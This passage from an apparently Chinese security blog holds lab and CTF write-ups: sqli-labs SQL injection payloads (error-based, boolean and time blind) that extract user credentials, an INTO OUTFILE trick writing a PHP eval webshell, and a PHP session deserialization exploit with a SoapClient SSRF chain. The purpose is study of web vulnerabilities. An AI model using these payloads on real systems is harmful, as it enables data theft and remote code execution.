<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AND updatexml(1,concat(</span><br><span class="line">    0x7e,</span><br><span class="line">    substr((SELECT group_concat(username) FROM users),1,32),</span><br><span class="line">    0x7e</span><br><span class="line">),1)--+</span><br></pre></td></tr></table></figure>

<p><strong>利用<code>substr()</code>函数绕过字数限制，爆出所有内容。</strong></p>
<h4 id="ExtractValue报错"><a href="#ExtractValue报错" class="headerlink" title="ExtractValue报错"></a><code>ExtractValue</code>报错</h4><p><strong>最多回显<code>32</code>个字符。</strong></p>
<p>爆数据库、版本号、用户名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AND ExtractValue(1,concat(0x7e,(SELECT database()),0x7e))--+</span><br></pre></td></tr></table></figure>

<p>爆表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AND ExtractValue(1,concat(</span><br><span class="line">    0x7e,</span><br><span class="line">    (SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=&#x27;security&#x27;),</span><br><span class="line">    0x7e))--+</span><br></pre></td></tr></table></figure>

<p>爆列</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AND ExtractValue(1,concat(</span><br><span class="line">    0x7e,</span><br><span class="line">    (SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema=&#x27;security&#x27; AND table_name=&#x27;users&#x27; ),</span><br><span class="line">    0x7e))--+</span><br></pre></td></tr></table></figure>

<p>爆内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AND ExtractValue(1,concat(</span><br><span class="line">    0x7e,</span><br><span class="line">    substr((SELECT group_concat(password) FROM users),1,31),</span><br><span class="line">    0x7e))--+</span><br></pre></td></tr></table></figure>

<h2 id="Lass-7文件写入"><a href="#Lass-7文件写入" class="headerlink" title="Lass-7文件写入"></a><code>Lass-7</code>文件写入</h2><p>参考文章：<a href="https://www.cnblogs.com/7-58/p/14101610.html">Mysql注入中的outfile、dumpfile函数详解 - gxy* - 博客园</a></p>
<h4 id="into-outfile命令"><a href="#into-outfile命令" class="headerlink" title="into outfile命令"></a><code>into outfile</code>命令</h4><p>运用该命令的格式如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT...into outfile &#x27;绝对路径&#x27;</span><br><span class="line">SELECT 1,2,3 into outfile &#x27;绝对路径&#x27;</span><br><span class="line">SELECT null,0x3c3f70687020406576616c28245f504f53545b227368656c6c225d293b203f3e,null</span><br><span class="line">	into outfile &#x27;绝对路径&#x27;</span><br><span class="line">#0x3c3f70687020406576616c28245f504f53545b227368656c6c225d293b203f3e是&lt;?php @eval($_POST[&quot;shell&quot;]); ?&gt;对应每个字符的十六进制连成的</span><br><span class="line"></span><br><span class="line">0x3c3f70687020406576616c285f504f53545b227368656c6c225d293b203f3e</span><br></pre></td></tr></table></figure>

<p>​	<code>0x3c3f70687020406576616c28245f504f53545b227368656c6c225d293b203f3e</code>是<?php @eval($_POST["shell"]); ?>对应每个字符的十六进制连成的。</p>
<h5 id="secure-file-priv参数"><a href="#secure-file-priv参数" class="headerlink" title="secure_file_priv参数"></a><code>secure_file_priv</code>参数</h5><p>​	因为涉及到在服务器上写入文件，所以<code>into outfile</code>函数能否成功执行受到参数<code>secure_file_priv</code>的影响，可以利用<code>select @@secure_file_priv</code>命令查询其值。</p>
<ul>
<li>当<code>secure_file_priv=&#39;&#39;</code>时，对导入导出无限制</li>
<li>当为指定的目录时，只能向指定的目录导入导出</li>
<li>当<code>secure_file_priv=NULL</code>时，禁止导入导出功能</li>
</ul>
<h5 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h5><ul>
<li>知道绝对路径</li>
<li>在数据库配置文件中含有配置项<code>secure_file_priv=&#39;&#39;</code></li>
<li>具有<code>root</code>权限</li>
</ul>
<p>还有<code>into dumpfile()</code>和<code>load_file()</code>这两个函数以后可能也会用到。</p>
<h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p><a href="https://blog.csdn.net/Waffle666/article/details/111465709">SQL注入之布尔盲注——sql-lab第八关</a></p>
<p><a href="https://blog.csdn.net/weixin_45146120/article/details/100104131?utm_source=app">布尔盲注详解</a></p>
<h3 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h3><p>设置字符串<code>str=&#39;hmhwazyt5799&#39;</code></p>
<ul>
<li><code>length(str)</code>返回字符串的长度，<code>12</code></li>
<li><code>left(str,1)</code>返回字符串<code>str</code>的第<code>1</code>个字符，<code>h</code></li>
<li><code>ascii(left(str,1))</code>返回<code>h</code>的<code>ascii</code>码，<code>49</code></li>
<li><code>substr((str),9,4)</code>返回<code>str</code>中从第<code>9</code>个字符开始长度为<code>4</code>的字符串，<code>5799</code></li>
</ul>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131922873.png" alt="image-20241031214502415" style="zoom:50%;" />

<h3 id="注入流程-1"><a href="#注入流程-1" class="headerlink" title="注入流程"></a>注入流程</h3><p>注：前面求闭合符号略过，传入<code>?id=1&#39;+payload</code>即可。</p>
<ul>
<li><strong>爆库名长度</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM tab WHERE id=1 AND (length(database())=8)</span><br></pre></td></tr></table></figure>

<p>设置变量</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131923243.png" alt="image-20241031182917813" style="zoom:50%;" />

<p>设置<code>payload</code></p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131923213.png" alt="image-20241031183010480" style="zoom:50%;" />

<p>爆破</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131923801.png" alt="image-20241031182811644" style="zoom:50%;" />

<p>成功确定数据库名长度为<code>8</code></p>
<ul>
<li><strong>爆数据库</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM tab WHERE id=1 AND (left(database(),1)=&#x27;s&#x27;)</span><br><span class="line">SELECT * FROM tab WHERE id=1 AND (ascii(left(database(),1))=57)</span><br><span class="line">SELECT * FROM tab WHERE id=1 AND (ascii(substr(database(),1,1))=57)</span><br></pre></td></tr></table></figure>

<p>设置变量和攻击方式，这里采取<code>Clustter bomb</code>攻击</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131923890.png" alt="QQ_1730382622041" style="zoom:50%;" />

<p>设置<code>payload</code></p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131923248.png" alt="image-20241031215143950" style="zoom:50%;" />

<img src="https://gitee.com/Qwen11/pic/raw/master/202410312152072.png" alt="image-20241031215206013" style="zoom:50%;" />

<p>爆破</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131923274.png" alt="image-20241031215748696"><br><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131924988.png" alt="image-20241031215539921"><br><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131924216.png" alt="image-20241031215559791"><br><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131925373.png" alt="image-20241031215853258"><br><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131925770.png" alt="image-20241031220417430"><br><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131925213.png" alt="image-20241031220443739"><br><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131925481.png" alt="image-20241031220522121"><br>!<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131926572.png" alt="image-20241031220655801"></p>
<p>成功确定数据库<code>security</code></p>
<ul>
<li><strong>爆表个数</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AND (SELECT count(table_name)</span><br><span class="line">     FROM information_schema.tables </span><br><span class="line">     WHERE table_schema=database())=4</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>爆各个表长度</strong></li>
</ul>
<p><strong>注意：</strong><code>length</code>括在<code>select</code>外，二者间要加两个括号。</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131926656.png" alt="image-20241101144846331" style="zoom:50%;" />

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#爆第一个表的长度</span><br><span class="line">AND length((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1))=6</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131926738.png" alt="image-20241101144922983" style="zoom:50%;" />

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#爆第二个表的长度</span><br><span class="line">AND length((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1,1))=8</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131926472.png" alt="image-20241101144948805" style="zoom:50%;" />

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#爆第三个表的长度</span><br><span class="line">AND length((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 2,1))=7</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131926955.png" alt="image-20241101145035538" style="zoom:50%;" />

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#爆第四个表的长度</span><br><span class="line">AND length((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 3,1))=5</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>爆各个表名</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#第四个表的第一个字符u的ascii码</span><br><span class="line">AND ascii(substr((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 3,1),1,1))=117</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>爆指定表中列个数</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AND (SELECT count(column_name) FROM information_schema.columns WHERE table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;)=3</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>爆各个列长度</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#users表中的第2列username的长度</span><br><span class="line">AND length((SELECT column_name FROM information_schema.columns WHERE table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; LIMIT 1,1))=8</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>爆各个列名</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#users表中的第3列password的第2个字符的ascii码</span><br><span class="line">AND ascii(substr((SELECT column_name FROM information_schema.columns WHERE table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; LIMIT 2,1),2,1))=97</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>爆字段个数</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AND (SELECT count(username) FROM users)=14</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>爆各个字段长度</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#users表中的username列的第1个字段的长度</span><br><span class="line">AND length((SELECT username FROM users LIMIT 0,1))=4</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>爆字段</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AND ascii(substr((SELECT username FROM users LIMIT 0,1),1,1))=68</span><br></pre></td></tr></table></figure>

<h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>​	时间盲注与布尔盲注相似，不同的是执行正确与否的参考，由是否报错变成了是否执行<code>sleep()</code>函数。测试的核心语句是<code>AND if(查询语句,sleep(3),1)</code>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AND if(length(database())=8,sleep(3),1)</span><br><span class="line">#如果 length(database())=8 为真(1),执行sleep(3)</span><br><span class="line">AND elt(length(database())=8,sleep(3))</span><br><span class="line">#如果 length(database())=8 为真(1),执行sleep(3)</span><br></pre></td></tr></table></figure>

<h2 id="POST"><a href="#POST" class="headerlink" title="POST"></a><code>POST</code></h2><h3 id="Lass-11"><a href="#Lass-11" class="headerlink" title="Lass-11"></a><code>Lass-11</code></h3><p>输入<code>1&#39;</code>回显信息如下，可以推断出传参格式是<code>username=&#39;&#39; and password=&#39;&#39;</code></p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131926143.png" alt="image-20241101193611754" style="zoom:50%;" />

<p>输入<code>1&#39; or 1=1#</code>，得<code>username=&#39;1&#39; or 1=1#&#39;</code>，回显正常，<strong>这里用<code>--+</code>注释会失败，要用<code>#</code>注释</strong></p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131926391.png" alt="image-20241101194908735" style="zoom:50%;" />

<p>接下来就按照<code>Pass-1</code>的思路，使用**<code>union</code>联合查询**注入即可</p>
<h3 id="Lass-12"><a href="#Lass-12" class="headerlink" title="Lass-12"></a><code>Lass-12</code></h3><p>输入<code>1</code>，回显错误，无报错信息</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131926822.png" alt="image-20241101200021319" style="zoom: 33%;" />

<p>输入<code>1&#39;</code>，回显错误，无报错信息</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131926212.png" alt="image-20241101200059415" style="zoom: 33%;" />

<p>输入<code>1&quot;</code>，回显错误，有报错信息，据此推断出闭合符号为<code>&quot;)</code></p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131926637.png" alt="image-20241101200133728" style="zoom:50%;" />

<p>尝试输入<code>1&quot;) or 1=1#</code>，回显正确</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131927444.png" alt="image-20241101200210040" style="zoom:50%;" />

<p>接下来使用**<code>union</code>联合查询**</p>
<h3 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a><code>Less-17</code></h3><p>​	本题有一个坑，<code>Username</code>中需填入正确的用户名，注入位置在<code>Password</code>处，使用**<code>updatexml()</code>函数报错注入**即可。</p>
<p>但是当我们爆字段时又出现了另一个问题，输入下面<code>payload</code>时</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and updatexml(1,concat(0x7e,substr((select group_concat(username) from users),1,32),0x7e),1)#</span><br></pre></td></tr></table></figure>

<p>有如下报错</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131927184.png" alt="image-20241101212954595" style="zoom:67%;" />

<p>修改<code>payload</code>，使**<code>select</code>的结果再通过一个中间表<code>select</code>多一次**，便可以绕过上面的问题</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AND updatexml(1,concat(0x7e,substr((SELECT group_concat(username) FROM (SELECT * FROM users) as hmhwazyt5799),1,32),0x7e),1)#</span><br></pre></td></tr></table></figure>

<p>成功返回<code>username</code>字段内容</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131927517.png" alt="image-20241101214340490" style="zoom:50%;" />

<h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><p>往往一次注入后，还要注入第二次才能执行命令。</p>
<p>对于这种</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131919088.png" alt="image-20250111143734313" style="zoom:150%;" />

<p>可以像下面这样注入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&quot;||updatexml(1,concat(0x7e,(SELECT(database())),0x7e),1)#</span><br></pre></td></tr></table></figure>

<h2 id="绕过字数限制的一些函数"><a href="#绕过字数限制的一些函数" class="headerlink" title="绕过字数限制的一些函数"></a>绕过字数限制的一些函数</h2><ul>
<li><code>substr</code></li>
<li><code>left</code></li>
<li><strong><code>regexp</code>正则匹配</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select(group_concat(flag))from(users)where(flag)regexp(&#x27;^f&#x27;)</span><br><span class="line">#匹配字符f，并以第一个f开始输出</span><br></pre></td></tr></table></figure>

<ul>
<li><strong><code>reverse</code>逆转输出</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reverse(select group_concat(flag) from users)</span><br><span class="line">#会倒着从最后一个字符开始输出</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>PHPSession反序列化</title>
    <url>/2025/02/06/web%E5%AE%89%E5%85%A8-phpsession%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h2 id="有关session的基础知识"><a href="#有关session的基础知识" class="headerlink" title="有关session的基础知识"></a>有关session的基础知识</h2><p>先来了解一下关于<code>session</code>的一些基础知识</p>
<p>什么是session？</p>
<span id="more"></span>

<blockquote>
<p>在计算机中，尤其是在网络应用中，称为“会话控制”。Session 对象存储特定用户会话所需的属性及配置信息。这样，当用户在应用程序的  Web 页之间跳转时，存储在 Session 对象中的变量将不会丢失，而是在整个用户会话中一直存在下去。当用户请求来自应用程序的 Web  页时，如果该用户还没有会话，则 Web 服务器将自动创建一个 Session 对象。当会话过期或被放弃后，服务器将终止该会话。</p>
</blockquote>
<p>session是如何起作用的？</p>
<blockquote>
<p>当第一次访问网站时，Seesion_start()函数就会创建一个唯一的Session  ID，并自动通过HTTP的响应头，将这个Session ID保存到客户端Cookie中。同时，也在服务器端创建一个以Session  ID命名的文件，用于保存这个用户的会话信息。当同一个用户再次访问这个网站时，也会自动通过HTTP的请求头将Cookie中保存的Seesion  ID再携带过来，这时Session_start()函数就不会再去分配一个新的Session ID，而是在服务器的硬盘中去寻找和这个Session ID同名的Session文件，将这之前为这个用户保存的会话信息读出，在当前脚本中应用，达到跟踪这个用户的目的。</p>
</blockquote>
<p>除此之外，还需要知道<code>session_start()</code>这个函数已经这个函数所起的作用：</p>
<blockquote>
<p>当会话自动开始或者通过 session_start() 手动开始的时候， PHP  内部会依据客户端传来的PHPSESSID来获取现有的对应的会话数据（即session文件）， PHP  会自动反序列化session文件的内容，并将之填充到 $_SESSION  超级全局变量中。如果不存在对应的会话数据，则创建名为sess_PHPSESSID(客户端传来的)的文件。如果客户端未发送PHPSESSID，则创建一个由32个字母组成的PHPSESSID，并返回set-cookie。</p>
</blockquote>
<h2 id="PHPSession序列化机制"><a href="#PHPSession序列化机制" class="headerlink" title="PHPSession序列化机制"></a>PHPSession序列化机制</h2><p>先了解一下php.ini中的一些Session配置</p>
<blockquote>
<p>session.save_path&#x3D;”” –设置session的存储路径<br>session.save_handler&#x3D;””–设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)<br>session.auto_start boolen–指定会话模块是否在请求开始时启动一个会话默认为0不启动<br>session.serialize_handler string–定义用来序列化&#x2F;反序列化的处理器名字。默认使用php</p>
</blockquote>
<p>Linux上搭建的话，常见的<code>php-session</code>存放位置：<br>&#x2F;var&#x2F;lib&#x2F;php5&#x2F;sess_PHPSESSID、&#x2F;var&#x2F;lib&#x2F;php7&#x2F;sess_PHPSESSID、&#x2F;var&#x2F;lib&#x2F;php&#x2F;sess_PHPSESSID、&#x2F;tmp&#x2F;sess_PHPSESSID、&#x2F;tmp&#x2F;sessions&#x2F;sess_PHPSESSED</p>
<p>根据<code>php.ini</code>中的配置项，将<code>$_SESSION</code>中保存的所有数据序列化存储到<code>PHPSESSID</code>对应的文件中，使用的三种不同的处理格式，即<code>session.serialize_handler</code>定义的三种引擎：</p>
<table>
<thead>
<tr>
<th>处理器</th>
<th>存储格式</th>
<th>例子</th>
</tr>
</thead>
<tbody><tr>
<td>php_serialize</td>
<td>经过serialize()函数反序列后的数组</td>
<td>a:1:{s:8:”sesssion”;s:3:”hhh”;}</td>
</tr>
<tr>
<td>php</td>
<td>键名+&#96;</td>
<td>&#96;+经过serialize()函数反序列后的值</td>
</tr>
<tr>
<td>php_binary</td>
<td>键名的长度对应的ASCII字符+键名+经过serialize()反序列后的值</td>
<td>不可见字符+sesssions:3:”hhh”;</td>
</tr>
</tbody></table>
<h2 id="漏洞利用演示"><a href="#漏洞利用演示" class="headerlink" title="漏洞利用演示"></a>漏洞利用演示</h2><p>ps.php文件：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;session.serialize_handler&quot;</span>, <span class="string">&quot;php_serialize&quot;</span>);<span class="comment">//用于在运行时设置配置选项</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();<span class="comment">//用于启动一个新的会话或恢复现有的会话。会话数据存储在服务器上，通过会话ID（通常存储在Cookie中）来识别。</span></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;sesssion&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;ses&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SESSION</span>[<span class="string">&#x27;session&#x27;</span>];</span><br></pre></td></tr></table></figure>

<p>p.php文件：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;session.serialize_handler&quot;</span>, <span class="string">&quot;php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>(); </span><br></pre></td></tr></table></figure>

<p>poc.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;name = <span class="string">&quot;system(&#x27;whoami&#x27;);&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="comment">#输出:   O:1:&quot;A&quot;:1:&#123;s:4:&quot;name&quot;;s:17:&quot;system(&#x27;whoami&#x27;);&quot;;&#125;</span></span><br></pre></td></tr></table></figure>

<ol>
<li>运行poc.php得到payload：<strong>O:1:”A”:1:{s:4:”name”;s:17:”system(‘whoami’);”;}</strong></li>
<li>访问ps.php，**ps.php?ses&#x3D;|O:1:”A”:1:{s:4:”name”;s:17:”system(‘whoami’);”;}**。</li>
<li>访问p.php。</li>
</ol>
<p>可以看到执行了payload中的<code>system(&#39;whoami&#39;)</code>函数，漏洞利用成功。</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202502060151428.png" alt="image-20250127205956973"></p>
<p>​	在访问ps.php后会生成一个PHPSESSID文件，使用php_serialize处理器来存储的session数据，其内容为：**a:1:{s:8:”sesssion”;s:49:”|O:1:”A”:1:{s:4:”name”;s:17:”system(‘whoami’);”;}**。而当我们再去访问p.php时，<code>session_start()</code>找到的文件依然是之前的PHPSESSID文件，php处理器在处理里面的session数据时，将<code>|</code>前面的内容当作键名，<code>|</code>后面的内容当作之前序列化的值。故而会对payload进行反序列化，进而触发__wakeup方法，来执行任意代码。</p>
<h2 id="例题-bestphp’s-revenge"><a href="#例题-bestphp’s-revenge" class="headerlink" title="例题-bestphp’s revenge"></a>例题-bestphp’s revenge</h2><p>先学习两个函数：</p>
<ol>
<li><strong><code>call_user_func</code>函数用于调用一个可调用的函数或方法。调用函数，第一个参数为字符串（函数名），第二个参数为回调函数的参数；调用方法，只用到第一个参数是一个数组，数组中依次为类名、方法名。</strong></li>
<li><strong><code>extract</code>函数用于从数组中导入变量到当前的符号表，即将数组的键作为变量名，数组的值作为变量的值。</strong></li>
</ol>
<p>源码如下：</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202502060151977.png" alt="image-20250127232948786" style="zoom:80%;" />

<p>扫描目录，有一个flag.php文件，由该文件得知只有127.0.0.1请求该页面才能得到flag，所以这明显是考察SSRF漏洞。</p>
<p>大致思路：利用原生类SoapClient中的<code>__call</code>方法进行SSRF和CRLF注入，来伪造任意header。但是这道题没有反序列化函数，这时候便要利用PHPSession反序列化漏洞来触发SoapClient类的__call方法了。</p>
<ol>
<li><p>PHPSession反序列化，构造SoapClient类及其中的任意header。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$location</span> = <span class="string">&quot;http://127.0.0.1/flag.php&quot;</span>;</span><br><span class="line"><span class="variable">$agent</span> = <span class="string">&quot;npfs\r\nCookie: PHPSESSID=579999\r\n&quot;</span>;</span><br><span class="line"><span class="variable">$uri</span> = <span class="string">&quot;http://127.0.0.1/&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span>=&gt;<span class="variable">$location</span>, <span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="variable">$agent</span>, <span class="string">&#x27;uri&#x27;</span>=&gt;<span class="variable">$uri</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;|&quot;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));   <span class="comment">#防止过滤使用url编码</span></span><br></pre></td></tr></table></figure>

<p>伪造session需要第一次以php_serialize处理器来存储session数据，而默认的处理器是php所以该怎么办呢？PHP7中的session_start()函数可以接收一个数组作为参数，然后覆盖php.ini中的session的配置项。</p>
<p>也就是说执行我们让源码执行<code>session_stsrt(array(&#39;serialize_handler&#39;=&gt;&#39;php_serialize&#39;))</code>即可，但是怎么能执行呢？利用call_user_func()和extract()这两个函数就行了。</p>
<p>GET参数f传入<code>session_start</code>、name传入poc，POST传入<code>serialize_handler=php_serialize</code>。</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202502060151191.png" alt="image-20250128004506601"></p>
</li>
<li><p>访问SoapClient类中不存在的方法，进而触发__call方法。</p>
<p>GET参数f传入<code>extract</code>、name传入<code>SoapClient</code>，POST传入<code>b=call_user_func</code>。</p>
<p>写一下代码运行大致过程：<code>call_user_func($_GET[&#39;f&#39;], $_POST);</code>变成<code>call_user_func(&#39;extract&#39;,&#39;b=call_user_func&#39;)</code>，得到<code>$b=call_user_func</code>；<code>$_SESSION[&#39;name&#39;]=$_GET[&#39;name&#39;]=SoapClient</code>，又因为<code>$a=array(reset($_SESSION), &#39;welcome_to_the_lctf2018&#39;);</code>得<code>$a=array(&#39;SoapClient&#39;,&#39;welcome_to_the_lctf2018&#39;)</code>，最后<code>call_user_func($b,$a)</code>触发__call方法。</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202502060151985.png" alt="image-20250128010121343" style="zoom: 67%;" />
</li>
<li><p>访问index.php，bp抓包修改PHSESSID值为579999（前面伪造的header中的PHPSESSID值），即可得到flag。</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202502060151087.png" alt="image-20250128010426077"></p>
</li>
</ol>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://xz.aliyun.com/news/6962">https://xz.aliyun.com/news/6962</a></p>
<p><a href="https://www.freebuf.com/articles/web/324519.html">https://www.freebuf.com/articles/web/324519.html</a></p>
<p><a href="https://blog.csdn.net/m0_73512445/article/details/134978636">[LCTF 2018]bestphp‘s revenge</a></p>
<p><a href="https://www.cnblogs.com/NPFS/p/14335370.html">https://www.cnblogs.com/NPFS/p/14335370.html</a></p>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>upload-labs靶场通关记录</title>
    <url>/2024/10/22/upload-labs%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p>Upload Labs 是一个基于 PHP 编写的开源靶场项目，专门用于模拟和研究文件上传漏洞。它包含多个关卡，每个关卡都模拟了不同的文件上传漏洞场景，旨在帮助用户全面了解文件上传漏洞的原理、利用方法和防御策略。</p>
<span id="more"></span>

<p>参考文章：</p>
<p><a href="https://www.cnblogs.com/henry666/p/17051491.html">全面了解文件上传漏洞, 通关upload-labs靶场! - 亨利其实很坏 - 博客园</a></p>
<p><a href="https://www.cnblogs.com/xiaoyus/articles/18250023">upload-labs通关全教程（建议萌新收藏）Web安全-文件上传漏洞超详细解析 - 白小雨 - 博客园</a></p>
<p><a href="https://www.cnblogs.com/iChet/p/16124082.html">文件上传漏洞之upload-labs靶场通关(20关) - iChet - 博客园</a></p>
